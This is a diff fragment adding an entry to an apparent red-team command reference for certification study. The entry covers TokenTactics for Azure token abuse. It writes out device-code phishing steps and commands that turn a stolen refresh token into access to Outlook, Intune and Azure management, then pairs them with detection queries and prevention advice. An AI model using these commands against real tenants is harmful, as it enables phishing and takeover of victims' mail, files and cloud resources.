+      "command": "Import-Module TokenTactics; Get-AzureToken -Client MSGraph",
+      "description": "TokenTactics is a PowerShell module for abusing Azure JWT access and refresh tokens. After a device-code or stolen refresh token, it swaps a refresh token for access tokens to many first-party resources (MSGraph, AADGraph, Outlook, Substrate, DeviceManagement, etc.), enabling lateral movement across M365 services without re-prompting the user.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Cloud Security",
+      "subcategory": "Azure Attacks",
+      "certifications": [
+        "MCRTA"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "rvrsh3ll/TokenTactics",
+      "tags": [
+        "tokentactics",
+        "azure",
+        "entra-id",
+        "token",
+        "refresh-token",
+        "device-code",
+        "m365"
+      ],
+      "mitre": [
+        "T1528",
+        "T1550.001",
+        "T1078.004"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  Import-Module .\\TokenTactics.psd1\n\n=== DEVICE-CODE PHISH (get first tokens) ===\n  Get-AzureToken -Client MSGraph\n  # prints a microsoft.com/devicelogin code; victim enters it -> you receive tokens\n\n=== REFRESH -> NEW RESOURCE TOKENS ===\n  # once you hold $response.refresh_token, pivot to other audiences:\n  RefreshTo-MSGraphToken   -domain <domain> -refreshToken $rt\n  RefreshTo-OutlookToken   -domain <domain> -refreshToken $rt\n  RefreshTo-AzureCoreManagementToken -domain <domain> -refreshToken $rt\n  RefreshTo-DeviceManagementToken   -domain <domain> -refreshToken $rt   # Intune\n  RefreshTo-SubstrateToken -domain <domain> -refreshToken $rt\n\n=== USE THE TOKEN ===\n  # feed $token.access_token to MSGraph calls, roadrecon, or AADInternals -AccessToken\n\n=== DECODE / INSPECT ===\n  Parse-JWTtoken -token $token.access_token    # aud, scp, roles, upn\n\n=== ALTERNATIVES ===\n  AADInternals   # broader toolkit incl. token acquisition\n  GraphRunner    # Graph-centric post-ex\n  roadtx (ROADtools) # token flows incl. PRT",
+      "examples": [
+        {
+          "label": "Device-code token request",
+          "command": "Get-AzureToken -Client MSGraph"
+        },
+        {
+          "label": "Pivot refresh token to Outlook",
+          "command": "RefreshTo-OutlookToken -domain <domain> -refreshToken $rt"
+        },
+        {
+          "label": "Decode a JWT",
+          "command": "Parse-JWTtoken -token $token.access_token"
+        }
+      ],
+      "references": [
+        {
+          "title": "TokenTactics",
+          "url": "https://github.com/rvrsh3ll/TokenTactics"
+        },
+        {
+          "title": "MITRE T1550.001",
+          "url": "https://attack.mitre.org/techniques/T1550/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-aadinternals",
+          "note": "AADInternals consumes the same tokens for broader attacks.",
+          "rel": "next"
+        },
+        {
+          "id": "cloud-graphrunner",
+          "note": "GraphRunner for Graph post-exploitation with the token.",
+          "rel": "next"
+        },
+        {
+          "id": "azure-authentication",
+          "note": "Underlying Entra auth flows abused here.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "OAuth refresh tokens are long-lived bearer artifacts. A refresh token for one first-party client can be redeemed for access tokens to other first-party resources (family-of-client-ids), so a single phished token grants wide reach without MFA re-prompts.",
+        "prerequisites": "A valid refresh token (from device-code phishing, token theft, or a stolen PRT). No password needed once the refresh token is held.",
+        "impact": "Cross-service access (mail, files, Intune, Azure management) as the victim, persistent until the refresh token is revoked or Conditional Access re-evaluates.",
+        "detection": "[MITRE T1550.001] Entra sign-in logs showing token redemptions across many first-party app IDs from one refresh token / IP in a short window; device-code authentications; impossible-travel between original sign-in and token-use IP.",
+        "artifacts": "Entra sign-in logs (appDisplayName variety, authenticationProtocol=deviceCode), token issuance bursts, unfamiliar client/IP combinations.",
+        "splunk_spl": "index=azure sourcetype=azure:aad:signin\n| stats dc(appDisplayName) as apps values(appDisplayName) as app_list by userPrincipalName, ipAddress, bin(_time,1h)\n| where apps > 4",
+        "elastic_kql": "azure.signinlogs.properties.authentication_protocol:deviceCode or azure.signinlogs.properties.app_display_name:*",
+        "sentinel_kql": "SigninLogs\n| summarize Apps=dcount(AppDisplayName), AppList=make_set(AppDisplayName) by UserPrincipalName, IPAddress, bin(TimeGenerated, 1h)\n| where Apps > 4",
+        "sigma_rules": "azure_tokentactics_cross_resource_token_use",
+        "prevention": "Conditional Access with device compliance and sign-in risk policies; block/limit device-code flow; shorten token lifetimes and enable continuous access evaluation (CAE); revoke refresh tokens on risk; phishing-resistant MFA (FIDO2).",
+        "sources": [
+          "rvrsh3ll/TokenTactics",
+          "https://attack.mitre.org/techniques/T1550/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Single identity redeeming tokens for many first-party apps",
+            "logic": "SigninLogs\n| where ResultType == 0\n| summarize Apps=dcount(AppDisplayName), AppList=make_set(AppDisplayName), IPs=make_set(IPAddress) by UserPrincipalName, bin(TimeGenerated, 1h)\n| where Apps > 4",
+            "data_source": "entra-id",
+            "attack": [
+              "T1550.001",
+              "T1078.004"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Power users with many integrated apps",
+            "tuning": "Baseline per-user app breadth; weight by new IP"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -192699,8 +193336,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1089,
-  "buildDate": "2026-11-11T05:35:44.141Z",
+  "totalCommands": 1095,
+  "buildDate": "2026-11-11T12:23:16.109Z",
   "certifications": [
     "CDSA",
     "CPTS",
